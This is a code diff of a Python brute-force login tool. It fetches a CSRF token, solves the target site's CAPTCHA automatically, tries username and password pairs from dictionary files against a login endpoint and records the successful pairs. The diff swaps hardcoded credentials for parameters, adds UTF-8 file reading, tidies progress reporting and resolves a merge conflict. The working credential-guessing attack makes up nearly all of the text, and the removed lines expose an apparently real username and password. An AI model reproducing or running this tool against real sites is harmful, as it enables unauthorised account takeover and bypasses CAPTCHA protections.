@@ -43,8 +43,9 @@ def crack(site, username, password):
     captcha_code = get_captcha(image_name)
     os.remove(image_name)
 
-    response = s.post(site + 'login', data={'csrf_token': csrf, 'username': 'tianzhijiao1119', 'password': '690847721',
-                                            'captcha_code': captcha_code, 'submit': 'Login'})
+    response = s.post(site + 'login', data={'csrf_token': csrf, 
+                                            'username': username, 
+                                            'password': password, 'captcha_code': captcha_code, 'submit': 'Login'})
     if check_successfully(response.content.decode()):
         return True, username, password
     return False, username, password
@@ -88,17 +89,17 @@ if __name__ == '__main__':
         if not os.path.exists(user_dict_path) or not os.path.exists(pass_dict_path):
             print("File %s or %s not found." % (data_dict_path, pass_dict_path))
             exit(-1)
-        with open(user_dict_path, 'r') as user_dict:
+        with open(user_dict_path, 'r', encoding='utf-8') as user_dict:
             users = user_dict.read()
             username_list = users.split('\n')
-        with open(pass_dict_path, 'r') as pass_dict:
+        with open(pass_dict_path, 'r', encoding='utf-8') as pass_dict:
             passwords = pass_dict.read()
             password_list = passwords.split('\n')
     else:
         if not os.path.exists(data_dict_path):
             print("File %s not found." % data_dict_path)
             exit(-1)
-        with open(data_dict_path, 'r') as data_dict:
+        with open(data_dict_path, 'r', encoding='utf-8') as data_dict:
             data = data_dict.read()
             lines = data.split('\n')
             for line in lines:
@@ -108,7 +109,6 @@ if __name__ == '__main__':
                     username_list.append(username)
                     password_list.append(password)
 
-<<<<<<< HEAD
     print('''
   ____        _      ____     
  |  _"\    U |"| u  / __"| u  
@@ -127,22 +127,24 @@ U| |_| |\| |_| |_,-.u___) |
     if options.cross:
         total_count = len(username_list) * len(password_list)
         pbar = tqdm(total=total_count)
+        pbar.set_description('Find %d matched pair(s)! Current complete' % match_count)
         for username in username_list:
             if len(username) <= 1:
                 pbar.update(len(password_list))
                 continue
             for password in password_list:
-                pbar.set_description('Find %d matched pair(s)! Current complete' % match_count)
                 pbar.update(1)
                 if len(password) <= 1:
                     continue
                 result, _, _ = crack(site, username, password)
                 if result:
                     match_count += 1
+                    pbar.set_description('Find %d matched pair(s)! Current complete' % match_count)
                     out.write(username + ' --- ' + password + '\n')
     else:
         total_count = len(username_list)
         pbar = tqdm(total=total_count)
+        pbar.set_description('Find %d matched pair(s)! Current complete' % match_count)
         for index in range(len(username_list)):
             pbar.update(1)
             username = username_list[index]
@@ -152,18 +154,6 @@ U| |_| |\| |_| |_,-.u___) |
             result, _, _ = crack(site, username, password)
             if result:
                 match_count += 1
+                pbar.set_description('Find %d matched pair(s)! Current complete' % match_count)
                 out.write(username + ' --- ' + password + '\n')
-                print('\rNow find %d username and password pair(s)' % match_count)
-
     out.close()
-=======
-    # 开始爆破
-    for index in range(len(username_list)):
-        username = username_list[index]
-        password = password_list[index]
-        if len(username) <= 1 or len(password) <= 1:
-            continue
-        result, _, _ = crack(site, username, password)
-        if result:
-            print("Find correct username and password: %s - %s" % (username, password))
->>>>>>> 56392e4e6e519cc7b4066c8ebd27e71b2d8118fb
